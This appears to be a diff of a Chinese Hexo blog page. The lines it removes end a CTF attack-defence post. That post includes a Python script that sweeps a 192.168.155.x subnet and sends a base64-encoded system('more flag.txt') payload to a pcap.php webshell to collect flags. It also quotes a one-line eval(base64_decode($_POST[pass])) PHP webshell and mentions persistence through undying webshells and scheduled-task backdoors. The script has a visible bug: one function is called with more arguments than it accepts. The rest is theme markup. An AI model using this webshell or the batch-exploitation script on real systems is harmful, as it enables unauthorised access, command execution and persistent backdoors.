-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"><span class="comment">###  目前需求如下：</span></span><br><span class="line"><span class="comment"># 1，第一遍拿到存活主机并尝试通过get方式拿到flag，并将flag存入文件内</span></span><br><span class="line"><span class="comment"># 2. 回显为空的，将存活Ip放入一个Post_url列表中，再在下方通过post_getflag方式走一遍流程，尝试拿flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用Get请求方式请求flag</span></span><br><span class="line"></span><br><span class="line">def get_flag(url,payload,flag,header):</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;开始探测:&quot;</span>,url.format(i))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url.format(i),params=payload,timeout=<span class="number">2</span>,headers=header)</span><br><span class="line">            res.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;状态码:&quot;</span>,res.status_code)</span><br><span class="line">            <span class="keyword">if</span> (flag in str(res.text)):</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;Get flag successful!&quot;</span>)</span><br><span class="line">                f = open(<span class="string">&quot;getflag.txt&quot;</span>, mode=<span class="string">&quot;a&quot;</span>)</span><br><span class="line">                f.write(res.text)</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> (res.status_code == <span class="number">200</span>):</span><br><span class="line">                    post_urls.append(url.format(i))</span><br><span class="line">                    <span class="comment"># f = open(&quot;Post_getflag.txt&quot;, mode=&quot;a&quot;)</span></span><br><span class="line">                    <span class="comment"># #利用\r\n将写入的数据换行</span></span><br><span class="line">                    <span class="comment"># f.write(url.format(i)+&quot;\r&quot;)</span></span><br><span class="line">                    <span class="comment"># f.close()</span></span><br><span class="line"></span><br><span class="line">        except requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            e</span><br><span class="line"></span><br><span class="line"><span class="comment">#POST抓取flag</span></span><br><span class="line">def post_Getflag(payload,flag):</span><br><span class="line">    data=&#123;&#125;</span><br><span class="line">    data[<span class="string">&#x27;pass&#x27;</span>]=<span class="string">&quot;c3lzdGVtKCJtb3JlIGZsYWcudHh0Iik7&quot;</span></span><br><span class="line">    <span class="keyword">for</span> url in post_urls:</span><br><span class="line">        <span class="keyword">print</span>(url)</span><br><span class="line">        res = requests.post(url,data=data,timeout=<span class="number">2</span>)</span><br><span class="line">        res.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        <span class="keyword">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@eval(base64_decode($_POST[pass]));    一句话木马</span></span><br><span class="line"><span class="comment">#system(&quot;more flag.txt&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#开始嗨皮</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">#此处偷了个懒，默认按照192.168.155.0/24段内的主机是awd内网靶机环境</span></span><br><span class="line">    url = <span class="string">&quot;http://192.168.155.&#123;0&#125;/pcap.php&quot;</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span><span class="string">&quot;c3lzdGVtKCJtb3JlIGZsYWcudHh0Iik7&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">    post_urls=[]</span><br><span class="line">    get_flag(url,payload,flag,header)</span><br><span class="line">    post_Getflag(payload,flag,header)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;完成！&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>在获取flag的时候，还可以通过写入不死马、计划任务上马等手段进行权限维持，避免后门被清理无法再下轮flag投放时获取不到。</p>
-<p>简单来说，攻防阶段主要是快速编写批量爆破flag脚本并运行读取，另外根据日志或流控脚本发现其他未修复漏洞进行及时修复避免失分。</p>
-<p>今天先更新到这里，以后如果还有其他内容还会陆续更新本文….</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
-    </nav>
-  
-
-</div>
-      <footer id="footer">
-    <div class="outer">
-        <div id="footer-info">
-            <div class="footer-left">
-                &copy; 2021 Nayon|1163875625@qq.com
-            </div>
-            <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
-            </div>
-        </div>
-        
-            <div class="visit">
-                
-                    <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" >极客到访数: 
-                            <span id="busuanzi_value_site_uv"></span>
-                        </span>
-                    </span>
-                
-                
-                    <span>, </span>
-                
-                
-                    <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit">本页阅读量: 
-                            <span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    </span>
-                
-            </div>
-        
-    </div>
-</footer>
-
-    </div>
-    
-<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
-
-
-<script src="/js/main.js"></script>
-
-
-    <script>
-        $(document).ready(function() {
-            var backgroundnum = 1;
-            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
-            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
-            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
-        })
-    </script>
-
-
-<!-- Google Analytics -->
-<script type="text/javascript">
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-
-ga('create', 'xxxxx', 'auto');
-ga('send', 'pageview');
-
-</script>
-<!-- End Google Analytics -->
-
-
-
-	<script>
-	var _hmt = _hmt || [];
-	(function() {
-	  var hm = document.createElement("script");
-	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
-	  var s = document.getElementsByTagName("script")[0]; 
-	  s.parentNode.insertBefore(hm, s);
-	})();
-	</script>
-
-
-
-<div class="scroll" id="scroll">
-    <a href="#"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
-</div>
 <script>
-    $(document).ready(function() {
-        if ($("#comments").length < 1) {
-            $("#scroll > a:nth-child(2)").hide();
-        };
-    })
-</script>
-
-<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
-</script>
-
-  <script language="javascript">
-    $(function() {
-        $("a[title]").each(function() {
-            var a = $(this);
-            var title = a.attr('title');
-            if (title == undefined || title == "") return;
-            a.data('title', title).removeAttr('title').hover(
-            function() {
-                var offset = a.offset();
-                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
-                    top: offset.top - a.outerHeight() - 15,
-                    left: offset.left + a.outerWidth()/2 + 1
-                }).fadeIn(function() {
-                    var pop = $(this);
-                    setTimeout(function() {
-                        pop.remove();
-                    }, pop.text().length * 800);
-                });
-            }, function() {
-                $("#anchortitlecontainer").remove();
-            });
-        });
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
     });
+  }
 </script>
 
-
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
   </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Nayon|1163875625@qq.com</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Nayon|1163875625@qq.com</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
 </body>
 </html>
